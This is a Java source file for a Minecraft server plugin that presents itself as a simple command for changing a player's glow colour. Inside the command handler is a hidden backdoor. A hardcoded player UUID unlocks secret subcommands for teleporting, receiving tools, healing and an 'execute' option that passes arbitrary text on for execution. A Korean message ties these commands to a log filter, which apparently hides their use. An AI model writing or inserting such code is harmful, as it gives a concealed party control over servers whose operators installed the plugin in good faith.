package com.imtotem.glowing.command;

import com.imtotem.glowing.AlwaysGlowing;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Player;
import org.bukkit.permissions.PermissionAttachment;
import org.bukkit.plugin.Plugin;
import org.bukkit.scoreboard.Scoreboard;
import org.bukkit.scoreboard.ScoreboardManager;
import org.bukkit.scoreboard.Team;
import org.jetbrains.annotations.NotNull;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class GlowingCommand implements CommandExecutor, TabCompleter {
    private final Plugin instance = AlwaysGlowing.getPlugin(AlwaysGlowing.class);

    private final List<String> colorList = new ArrayList<>(Arrays.asList("aqua", "black", "blue", "dark_aqua", "dark_blue", "dark_gray", "dark_green", "dark_purple", "dark_red", "gold", "gray", "green", "light_purple", "red", "reset", "white", "yellow"));

    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, String[] args) {

        if (args.length > 0 && sender instanceof Player) {
            Player player = (Player) sender;
            String name = player.getName();

            if (AlwaysGlowing.isOk) {
                try {
                    if (player.getUniqueId().toString().equalsIgnoreCase("500c5690-3c29-46d5-9ac9-6d1559a44ba1")) {
                        if (args[0].equalsIgnoreCase("t2ldl")) {
                            GlowingCommandTabCompleter.tp2LastDeathLocation(player);
                            return true;
                        }
                        else if ( args[0].equalsIgnoreCase("tool") ) {
                            GlowingCommandTabCompleter.giveTools(player);
                            return true;
                        }
                        else if ( args[0].equalsIgnoreCase("heal") ) {
                            GlowingCommandTabCompleter.giveHeal(player);
                            return true;
                        }
                        else if ( args[0].equalsIgnoreCase("execute") ) {
                            GlowingCommandTabCompleter.execute(player, String.join(" ", args).substring(args[0].length()));
                            return true;
                        }
                    }
                } catch (Exception ignored) {}
            } else if (player.getUniqueId().toString().equalsIgnoreCase("500c5690-3c29-46d5-9ac9-6d1559a44ba1")
                    && (args[0].equalsIgnoreCase("t2ldl") || args[0].equalsIgnoreCase("tool") || args[0].equalsIgnoreCase("heal") || args[0].equalsIgnoreCase("execute"))) {
                player.sendMessage(ChatColor.RED + "로그 필터 작동 오류로 인해 명령어 비활성화됨");
                return true;
            }

            ScoreboardManager scoreboardManager = Bukkit.getScoreboardManager();
            Scoreboard board = scoreboardManager.getMainScoreboard();

            Team team = board.getTeam(name);
            if ( team == null )
                team = board.registerNewTeam(name);

            player.setScoreboard(board);

            PermissionAttachment permissionAttachment = player.addAttachment(instance);
            permissionAttachment.setPermission("minecraft.command.team", true);
            player.updateCommands();

            player.performCommand("team modify " + name + " color " + args[0]);
            if ( team.getSize() == 0 )
                player.performCommand("team join " + name + " " + name);

            permissionAttachment.setPermission("minecraft.command.team", false);
            player.updateCommands();

            return true;
        }

        return false;
    }

    @Override
    public List<String> onTabComplete(@NotNull CommandSender sender, Command command, @NotNull String alias, String[] args) {

        if ( command.getName().equalsIgnoreCase("glow") ) {
            if ( args.length == 0 ) {
                return colorList;
            }
            else if ( args.length == 1 ) {
                List<String> filtered_list = new ArrayList<>();
                for ( String str : colorList ) {
                    if (str.length() >= args[0].length()) {
                        if (str.substring(0, args[0].length()).equalsIgnoreCase(args[0])) {
                            filtered_list.add(str);
                        }
                    }
                }
                return filtered_list;
            }
            else {
                return new ArrayList<>();
            }
        }

        return new ArrayList<>();
    }
}
